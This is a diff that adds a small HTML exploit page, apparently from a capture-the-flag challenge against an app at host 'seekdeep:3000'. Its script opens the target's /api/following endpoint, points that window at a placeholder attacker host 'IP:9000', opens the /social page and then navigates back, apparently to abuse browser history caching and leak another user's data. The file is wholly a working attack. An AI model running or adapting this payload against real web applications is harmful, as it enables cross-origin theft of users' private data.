@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+</head>
+<body>
+    <h1>hi</h1>
+    <script type="module">
+        const sleep = ms => new Promise((resolve) => setTimeout(resolve, ms))
+
+        if (location.search === "?exploit") {
+            const page = window.open("http://seekdeep:3000/api/following");
+            await sleep(500);
+            page.location.href = "http://IP:9000/index.html";
+            window.open(`http://seekdeep:3000/social`);
+            await sleep(500);
+            page.history.back();
+        }
+    </script>
+</body>
+</html>
